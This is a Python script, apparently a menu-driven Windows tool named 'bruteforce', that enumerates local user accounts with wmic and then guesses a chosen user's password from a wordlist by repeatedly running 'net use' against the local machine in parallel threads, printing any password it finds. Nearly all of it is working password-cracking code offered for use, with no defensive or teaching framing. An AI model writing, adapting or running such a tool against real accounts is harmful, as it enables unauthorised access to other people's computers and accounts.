import os
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor

def list_users():
    try:
        result = subprocess.check_output('wmic useraccount where "localaccount=\'true\'" get name,sid,status', shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        print(result)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e.output}")
    input("\nPress any key to return to the main menu...")

def bruteforce():
    user = input("\n[TARGET USER]\n>> ")
    wordlist = input("\n[PASSWORD LIST]\n>> ")

    if not os.path.exists(wordlist):
        print("\nError: File not found")
        input("\nPress any key to return to the main menu...")
        return

    if subprocess.call(['net', 'user', user], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
        print("\nError: User doesn't exist")
        input("\nPress any key to return to the main menu...")
        return

    try:
        with open(wordlist, 'r') as file:
            passwords = [line.strip() for line in file]
    except Exception as e:
        print(f"Error reading the wordlist file: {e}")
        return

    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [executor.submit(try_password, user, pass_attempt, idx) for idx, pass_attempt in enumerate(passwords)]

        for future in futures:
            if future.result():
                break

    print("\nPress any key to return to the main menu...")
    input()

def try_password(user, pass_attempt, idx):
    try:
        result = subprocess.run(['net', 'use', '\\\\127.0.0.1', f'/user:{user}', pass_attempt], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        if idx % 100 == 0:
            print(f"[ATTEMPT {idx + 1}] {pass_attempt}")
        
        stderr_output = result.stderr.decode('ISO-8859-1', errors='ignore')

        if "System error 1331" in stderr_output:
            return False
        
        try:
            net_use_output = subprocess.check_output('net use', shell=True, stderr=subprocess.PIPE, universal_newlines=True)
            if '\\\\127.0.0.1' in net_use_output:
                print(f"\n[+] Password found: {pass_attempt}")
                return True
        except subprocess.CalledProcessError as e:
            print(f"Error while checking net use: {e.output}")
            return False

    except subprocess.CalledProcessError as e:
        print(f"Error: {e.output}")
    except Exception as e:
        print(f"Unexpected error: {e}")

    return False

def main_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(""" 
      ___.                 __          _____                           
      \_ ^|_________ __ ___/  ^|_  _____/ ____\___________   ____  ____  
       ^| __ \_  __ \  ^|  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \ 
       ^| \_\ \  ^| \/  ^|  /^|  ^| \  ___/^|  ^| (  ^<_^> )  ^| \/\  \__\  ___/ 
       ^|___  /__^|  ^|____/ ^|__^|  \___  ^>__^|  \____/^|__^|    \___  ^>___  ^>
           \/                       \/                        \/    \/ 
    """)
        print("╔════════════════════╗")
        print("║  COMMANDS:         ║")
        print("║                    ║")
        print("║  1. List Users     ║")
        print("║  2. Bruteforce     ║")
        print("╚════════════════════╝")
        choice = input(">> ")

        if choice == "1":
            list_users()
        elif choice == "2":
            bruteforce()
        else:
            print("Invalid choice. Please select a valid option.")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
